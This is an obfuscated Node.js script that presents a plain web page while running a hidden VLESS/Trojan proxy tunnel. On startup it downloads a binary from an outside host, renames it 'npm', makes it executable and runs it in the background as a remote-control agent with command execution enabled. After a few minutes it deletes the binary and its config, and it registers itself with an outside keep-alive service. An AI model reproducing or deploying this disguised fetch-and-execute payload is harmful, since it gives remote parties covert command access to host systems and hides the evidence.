const _0x49bb5c=_0xa2d7;(function(_0x4db04c,_0x2e1e8e){const _0x5e0bde=_0xa2d7,_0x2ba662=_0x4db04c();while(!![]){try{const _0x42f734=-parseInt(_0x5e0bde(0xe2))/0x1+parseInt(_0x5e0bde(0x11b))/0x2+-parseInt(_0x5e0bde(0x125))/0x3+-parseInt(_0x5e0bde(0xca))/0x4+parseInt(_0x5e0bde(0xeb))/0x5+parseInt(_0x5e0bde(0xe5))/0x6*(-parseInt(_0x5e0bde(0x123))/0x7)+-parseInt(_0x5e0bde(0xbe))/0x8*(-parseInt(_0x5e0bde(0xda))/0x9);if(_0x42f734===_0x2e1e8e)break;else _0x2ba662['push'](_0x2ba662['shift']());}catch(_0x189e29){_0x2ba662['push'](_0x2ba662['shift']());}}}(_0x5c92,0xf08cb));const os=require('os'),http=require(_0x49bb5c(0x103)),fs=require('fs'),axios=require(_0x49bb5c(0xb2)),net=require(_0x49bb5c(0xd6)),path=require(_0x49bb5c(0xcd)),crypto=require(_0x49bb5c(0x10a)),{Buffer}=require(_0x49bb5c(0x106)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x49bb5c(0x107)][_0x49bb5c(0x11f)]||_0x49bb5c(0xf6),NEZHA_SERVER=process[_0x49bb5c(0x107)][_0x49bb5c(0x100)]||'',NEZHA_PORT=process[_0x49bb5c(0x107)][_0x49bb5c(0xd9)]||'',NEZHA_KEY=process['env'][_0x49bb5c(0xc4)]||'',DOMAIN=process[_0x49bb5c(0x107)]['DOMAIN']||_0x49bb5c(0x11a),AUTO_ACCESS=process['env'][_0x49bb5c(0xb4)]||!![],WSPATH=process['env'][_0x49bb5c(0xec)]||UUID[_0x49bb5c(0xce)](0x0,0x8),SUB_PATH=process['env'][_0x49bb5c(0xc9)]||_0x49bb5c(0xc2),NAME=process[_0x49bb5c(0x107)][_0x49bb5c(0xcf)]||'Hug',PORT=process[_0x49bb5c(0x107)][_0x49bb5c(0x10f)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1662f5=_0x49bb5c;try{const _0x12b547=await axios[_0x1662f5(0xb0)](_0x1662f5(0xba)),_0x21ce9b=_0x12b547[_0x1662f5(0xbb)];ISP=(_0x21ce9b[_0x1662f5(0xf2)]+'-'+_0x21ce9b[_0x1662f5(0xdd)])[_0x1662f5(0xb9)](/ /g,'_');}catch(_0x2a9440){ISP=_0x1662f5(0xd5);}};GetISP();function _0xa2d7(_0x82dca3,_0x11b415){_0x82dca3=_0x82dca3-0xad;const _0x5c9220=_0x5c92();let _0xa2d7e2=_0x5c9220[_0x82dca3];return _0xa2d7e2;}const httpServer=http[_0x49bb5c(0x11e)]((_0x20e1d6,_0xdc8c33)=>{const _0x5016aa=_0x49bb5c;if(_0x20e1d6[_0x5016aa(0xdc)]==='/'){const _0x3c315e=path[_0x5016aa(0xfa)](__dirname,'index.html');fs[_0x5016aa(0xb5)](_0x3c315e,_0x5016aa(0x113),(_0x56f963,_0x4f3d25)=>{const _0x14c837=_0x5016aa;if(_0x56f963){_0xdc8c33['writeHead'](0xc8,{'Content-Type':'text/html'}),_0xdc8c33[_0x14c837(0x116)]('Hello\x20world!');return;}_0xdc8c33[_0x14c837(0xd3)](0xc8,{'Content-Type':_0x14c837(0xf3)}),_0xdc8c33[_0x14c837(0x116)](_0x4f3d25);});return;}else{if(_0x20e1d6[_0x5016aa(0xdc)]==='/'+SUB_PATH){const _0x264757=_0x5016aa(0x118)+UUID+'@'+DOMAIN+_0x5016aa(0xc6)+DOMAIN+_0x5016aa(0xf7)+DOMAIN+_0x5016aa(0x127)+WSPATH+'#'+NAME+'-'+ISP,_0x4eb32c=_0x5016aa(0xfe)+UUID+'@'+DOMAIN+_0x5016aa(0x102)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5016aa(0x127)+WSPATH+'#'+NAME+'-'+ISP,_0x1efb24=_0x264757+'\x0a'+_0x4eb32c,_0x1fb840=Buffer['from'](_0x1efb24)[_0x5016aa(0xc3)](_0x5016aa(0xb7));_0xdc8c33['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0xdc8c33['end'](_0x1fb840+'\x0a');}else _0xdc8c33[_0x5016aa(0xd3)](0x194,{'Content-Type':_0x5016aa(0xcc)}),_0xdc8c33['end'](_0x5016aa(0xdb));}}),wss=new WebSocket[(_0x49bb5c(0x10b))]({'server':httpServer}),uuid=UUID[_0x49bb5c(0xb9)](/-/g,''),DNS_SERVERS=[_0x49bb5c(0xf9),_0x49bb5c(0x122)];function resolveHost(_0x19b47e){return new Promise((_0xf63852,_0x20c86d)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x19b47e)){_0xf63852(_0x19b47e);return;}let _0x7e1928=0x0;function _0x2e2e81(){const _0x3fdba0=_0xa2d7;if(_0x7e1928>=DNS_SERVERS[_0x3fdba0(0x117)]){_0x20c86d(new Error(_0x3fdba0(0xe8)+_0x19b47e+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x7db496=DNS_SERVERS[_0x7e1928];_0x7e1928++;const _0x4fd992=_0x3fdba0(0xbf)+encodeURIComponent(_0x19b47e)+_0x3fdba0(0x10d);axios['get'](_0x4fd992,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x3fdba0(0xff)](_0x743dd2=>{const _0x4ba65c=_0x3fdba0,_0x31c758=_0x743dd2[_0x4ba65c(0xbb)];if(_0x31c758[_0x4ba65c(0x114)]===0x0&&_0x31c758[_0x4ba65c(0xb1)]&&_0x31c758[_0x4ba65c(0xb1)]['length']>0x0){const _0x285244=_0x31c758[_0x4ba65c(0xb1)][_0x4ba65c(0xaf)](_0x4b1b9e=>_0x4b1b9e[_0x4ba65c(0x110)]===0x1);if(_0x285244){_0xf63852(_0x285244[_0x4ba65c(0xbb)]);return;}}_0x2e2e81();})[_0x3fdba0(0x10c)](_0x5c814e=>{_0x2e2e81();});}_0x2e2e81();});}function handleVlessConnection(_0x1adbdb,_0x41ea06){const _0x2a7435=_0x49bb5c,[_0x5e2835]=_0x41ea06,_0x28443d=_0x41ea06['slice'](0x1,0x11);if(!_0x28443d[_0x2a7435(0xe1)]((_0x295f58,_0x558cc7)=>_0x295f58==parseInt(uuid[_0x2a7435(0xc0)](_0x558cc7*0x2,0x2),0x10)))return![];let _0x40a6c=_0x41ea06[_0x2a7435(0xce)](0x11,0x12)[_0x2a7435(0x112)]()+0x13;const _0xddc3d2=_0x41ea06[_0x2a7435(0xce)](_0x40a6c,_0x40a6c+=0x2)[_0x2a7435(0x121)](0x0),_0x2c7433=_0x41ea06[_0x2a7435(0xce)](_0x40a6c,_0x40a6c+=0x1)[_0x2a7435(0x112)](),_0x58c535=_0x2c7433==0x1?_0x41ea06[_0x2a7435(0xce)](_0x40a6c,_0x40a6c+=0x4)['join']('.'):_0x2c7433==0x2?new TextDecoder()[_0x2a7435(0xad)](_0x41ea06[_0x2a7435(0xce)](_0x40a6c+0x1,_0x40a6c+=0x1+_0x41ea06[_0x2a7435(0xce)](_0x40a6c,_0x40a6c+0x1)[_0x2a7435(0x112)]())):_0x2c7433==0x3?_0x41ea06[_0x2a7435(0xce)](_0x40a6c,_0x40a6c+=0x10)[_0x2a7435(0xe3)]((_0x8f5a37,_0x364a43,_0x1154c9,_0x529380)=>_0x1154c9%0x2?_0x8f5a37[_0x2a7435(0xc8)](_0x529380['slice'](_0x1154c9-0x1,_0x1154c9+0x1)):_0x8f5a37,[])[_0x2a7435(0xd0)](_0xbfa9e9=>_0xbfa9e9['readUInt16BE'](0x0)[_0x2a7435(0xc3)](0x10))[_0x2a7435(0xfa)](':'):'';_0x1adbdb[_0x2a7435(0x109)](new Uint8Array([_0x5e2835,0x0]));const _0x37106e=createWebSocketStream(_0x1adbdb);return resolveHost(_0x58c535)[_0x2a7435(0xff)](_0x3fca20=>{const _0x15287d=_0x2a7435;net['connect']({'host':_0x3fca20,'port':_0xddc3d2},function(){const _0x3c1baa=_0xa2d7;this[_0x3c1baa(0xd8)](_0x41ea06[_0x3c1baa(0xce)](_0x40a6c)),_0x37106e['on'](_0x3c1baa(0xde),()=>{})['pipe'](this)['on'](_0x3c1baa(0xde),()=>{})[_0x3c1baa(0xe4)](_0x37106e);})['on'](_0x15287d(0xde),()=>{});})[_0x2a7435(0x10c)](_0x1eb3af=>{const _0x529ba5=_0x2a7435;net[_0x529ba5(0xf8)]({'host':_0x58c535,'port':_0xddc3d2},function(){const _0x146aac=_0x529ba5;this[_0x146aac(0xd8)](_0x41ea06[_0x146aac(0xce)](_0x40a6c)),_0x37106e['on'](_0x146aac(0xde),()=>{})['pipe'](this)['on'](_0x146aac(0xde),()=>{})[_0x146aac(0xe4)](_0x37106e);})['on'](_0x529ba5(0xde),()=>{});}),!![];}function handleTrojanConnection(_0x4a64b5,_0x4680c9){const _0x33d84b=_0x49bb5c;try{if(_0x4680c9[_0x33d84b(0x117)]<0x3a)return![];const _0x4c93c4=_0x4680c9[_0x33d84b(0xce)](0x0,0x38)[_0x33d84b(0xc3)](),_0xfe0a46=[UUID];let _0x5e5d73=null;for(const _0x1e1dfb of _0xfe0a46){const _0x5548ef=crypto[_0x33d84b(0x101)](_0x33d84b(0xf5))['update'](_0x1e1dfb)[_0x33d84b(0xf1)](_0x33d84b(0xe0));if(_0x5548ef===_0x4c93c4){_0x5e5d73=_0x1e1dfb;break;}}if(!_0x5e5d73)return![];let _0x410004=0x38;_0x4680c9[_0x410004]===0xd&&_0x4680c9[_0x410004+0x1]===0xa&&(_0x410004+=0x2);const _0x22106d=_0x4680c9[_0x410004];if(_0x22106d!==0x1)return![];_0x410004+=0x1;const _0x5021fd=_0x4680c9[_0x410004];_0x410004+=0x1;let _0x1dd552,_0x49018f;if(_0x5021fd===0x1)_0x1dd552=_0x4680c9[_0x33d84b(0xce)](_0x410004,_0x410004+0x4)[_0x33d84b(0xfa)]('.'),_0x410004+=0x4;else{if(_0x5021fd===0x3){const _0x3d179f=_0x4680c9[_0x410004];_0x410004+=0x1,_0x1dd552=_0x4680c9['slice'](_0x410004,_0x410004+_0x3d179f)['toString'](),_0x410004+=_0x3d179f;}else{if(_0x5021fd===0x4)_0x1dd552=_0x4680c9[_0x33d84b(0xce)](_0x410004,_0x410004+0x10)[_0x33d84b(0xe3)]((_0x54e7fc,_0x2944f3,_0x247239,_0x13b4eb)=>_0x247239%0x2?_0x54e7fc[_0x33d84b(0xc8)](_0x13b4eb['slice'](_0x247239-0x1,_0x247239+0x1)):_0x54e7fc,[])[_0x33d84b(0xd0)](_0x23752d=>_0x23752d[_0x33d84b(0x121)](0x0)[_0x33d84b(0xc3)](0x10))['join'](':'),_0x410004+=0x10;else return![];}}_0x49018f=_0x4680c9['readUInt16BE'](_0x410004),_0x410004+=0x2;_0x410004<_0x4680c9['length']&&_0x4680c9[_0x410004]===0xd&&_0x4680c9[_0x410004+0x1]===0xa&&(_0x410004+=0x2);const _0x521ff3=createWebSocketStream(_0x4a64b5);return resolveHost(_0x1dd552)[_0x33d84b(0xff)](_0x4c183b=>{const _0x877f03=_0x33d84b;net[_0x877f03(0xf8)]({'host':_0x4c183b,'port':_0x49018f},function(){const _0x5004d7=_0x877f03;_0x410004<_0x4680c9[_0x5004d7(0x117)]&&this[_0x5004d7(0xd8)](_0x4680c9[_0x5004d7(0xce)](_0x410004)),_0x521ff3['on'](_0x5004d7(0xde),()=>{})[_0x5004d7(0xe4)](this)['on'](_0x5004d7(0xde),()=>{})['pipe'](_0x521ff3);})['on'](_0x877f03(0xde),()=>{});})[_0x33d84b(0x10c)](_0x3cb098=>{const _0x5002d8=_0x33d84b;net[_0x5002d8(0xf8)]({'host':_0x1dd552,'port':_0x49018f},function(){const _0x4b4a94=_0x5002d8;_0x410004<_0x4680c9[_0x4b4a94(0x117)]&&this[_0x4b4a94(0xd8)](_0x4680c9['slice'](_0x410004)),_0x521ff3['on']('error',()=>{})[_0x4b4a94(0xe4)](this)['on'](_0x4b4a94(0xde),()=>{})[_0x4b4a94(0xe4)](_0x521ff3);})['on']('error',()=>{});}),!![];}catch(_0x5b35a1){return![];}}wss['on'](_0x49bb5c(0x124),(_0x57c3c5,_0x2b8cbd)=>{const _0x21b9c4=_0x2b8cbd['url']||'';_0x57c3c5['once']('message',_0x30ed4f=>{const _0x2eefda=_0xa2d7;if(_0x30ed4f[_0x2eefda(0x117)]>0x11&&_0x30ed4f[0x0]===0x0){const _0x519e45=_0x30ed4f['slice'](0x1,0x11),_0x3c6e4d=_0x519e45['every']((_0x4bedc7,_0x10da68)=>_0x4bedc7==parseInt(uuid['substr'](_0x10da68*0x2,0x2),0x10));if(_0x3c6e4d){!handleVlessConnection(_0x57c3c5,_0x30ed4f)&&_0x57c3c5[_0x2eefda(0x10e)]();return;}}!handleTrojanConnection(_0x57c3c5,_0x30ed4f)&&_0x57c3c5[_0x2eefda(0x10e)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x3e8779=_0x49bb5c,_0x53437f=os['arch']();return _0x53437f===_0x3e8779(0xae)||_0x53437f===_0x3e8779(0xea)||_0x53437f===_0x3e8779(0xb3)?!NEZHA_PORT?_0x3e8779(0x11d):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x3e8779(0x105);},downloadFile=async()=>{const _0x4e5032=_0x49bb5c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1ec5bc=getDownloadUrl(),_0x4aafe2=await axios({'method':_0x4e5032(0xb0),'url':_0x1ec5bc,'responseType':'stream'}),_0x3b9c13=fs[_0x4e5032(0x120)](_0x4e5032(0xfb));return _0x4aafe2['data'][_0x4e5032(0xe4)](_0x3b9c13),new Promise((_0x367862,_0x32101d)=>{const _0xb69bed=_0x4e5032;_0x3b9c13['on']('finish',()=>{const _0x2c4511=_0xa2d7;console[_0x2c4511(0xc5)]('npm\x20download\x20successfully'),exec(_0x2c4511(0xf0),_0x35260f=>{if(_0x35260f)_0x32101d(_0x35260f);_0x367862();});}),_0x3b9c13['on'](_0xb69bed(0xde),_0x32101d);});}catch(_0x548598){throw _0x548598;}},runnz=async()=>{const _0x27c020=_0x49bb5c;try{const _0x242160=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x242160[_0x27c020(0xd7)]()!==''){console[_0x27c020(0xc5)](_0x27c020(0xe6));return;}}catch(_0x4b5934){}await downloadFile();let _0x222414='',_0x42d573=['443',_0x27c020(0xfd),_0x27c020(0x104),'2087',_0x27c020(0xd1),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5234fb=_0x42d573[_0x27c020(0x108)](NEZHA_PORT)?_0x27c020(0x119):'';_0x222414='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5234fb+_0x27c020(0xd4);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4f93fc=NEZHA_SERVER[_0x27c020(0x108)](':')?NEZHA_SERVER[_0x27c020(0x115)](':')['pop']():'',_0x5d7357=_0x42d573[_0x27c020(0x108)](_0x4f93fc)?_0x27c020(0xbd):_0x27c020(0xbc),_0x269167=_0x27c020(0xc7)+NEZHA_KEY+_0x27c020(0xef)+NEZHA_SERVER+_0x27c020(0xb8)+_0x5d7357+_0x27c020(0xee)+UUID;fs[_0x27c020(0xdf)]('config.yaml',_0x269167);}_0x222414=_0x27c020(0xb6);}else{console[_0x27c020(0xc5)](_0x27c020(0xe7));return;}}try{exec(_0x222414,{'shell':_0x27c020(0xc1)},_0x444d6f=>{const _0x115d4e=_0x27c020;if(_0x444d6f)console[_0x115d4e(0xde)](_0x115d4e(0xf4),_0x444d6f);else console[_0x115d4e(0xc5)](_0x115d4e(0x126));});}catch(_0x45ff53){console[_0x27c020(0xde)](_0x27c020(0xe9)+_0x45ff53);}};function _0x5c92(){const _0x582ab6=['client_secret:\x20','concat','SUB_PATH','6958364kDYFrs','https://oooo.serv00.net/add-url','text/plain','path','slice','NAME','map','2083','unlink','writeHead','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Unknown','net','trim','write','NEZHA_PORT','42423039cAOmyb','Not\x20Found\x0a','url','asOrganization','error','writeFileSync','hex','every','1497785pKcMDR','reduce','pipe','9185142Iqzapx','npm\x20is\x20already\x20running,\x20skip\x20running...','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','Failed\x20to\x20resolve\x20','error:\x20','arm64','4600740xSfZyI','WSPATH','post','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','chmod\x20+x\x20npm','digest','country','text/html','npm\x20running\x20error:','sha224','715abf30-2577-8d99-6d76-8d60cea59ab5','&fp=chrome&type=ws&host=','connect','8.8.4.4','join','npm','listen','8443','trojan://','then','NEZHA_SERVER','createHash',':443?security=tls&sni=','http','2096','https://amd64.ssss.nyc.mn/agent','buffer','env','includes','send','crypto','Server','catch','&type=A','close','PORT','type','config.yaml','readUInt8','utf8','Status','split','end','length','vless://','--tls','hys.edisonhu.de5.net','2635320ZlzzIG','application/json','https://arm64.ssss.nyc.mn/v1','createServer','UUID','createWriteStream','readUInt16BE','1.1.1.1','7JCNyab','connection','3593865cRaTzi','npm\x20is\x20running','&path=%2F','decode','arm','find','get','Answer','axios','aarch64','AUTO_ACCESS','readFile','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','base64','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','replace','https://speed.cloudflare.com/meta','data','false','true','8IIDain','https://dns.google/resolve?name=','substr','/bin/bash','vps','toString','NEZHA_KEY','log',':443?encryption=none&security=tls&sni='];_0x5c92=function(){return _0x582ab6;};return _0x5c92();}async function addAccessTask(){const _0x4d7a22=_0x49bb5c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5dca3a='https://'+DOMAIN;try{const _0x1a76e0=await axios[_0x4d7a22(0xed)](_0x4d7a22(0xcb),{'url':_0x5dca3a},{'headers':{'Content-Type':_0x4d7a22(0x11c)}});console[_0x4d7a22(0xc5)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x2fe0d2){}}const delFiles=()=>{const _0x1cf53a=_0x49bb5c;fs[_0x1cf53a(0xd2)](_0x1cf53a(0xfb),()=>{}),fs[_0x1cf53a(0xd2)](_0x1cf53a(0x111),()=>{});};httpServer[_0x49bb5c(0xfc)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});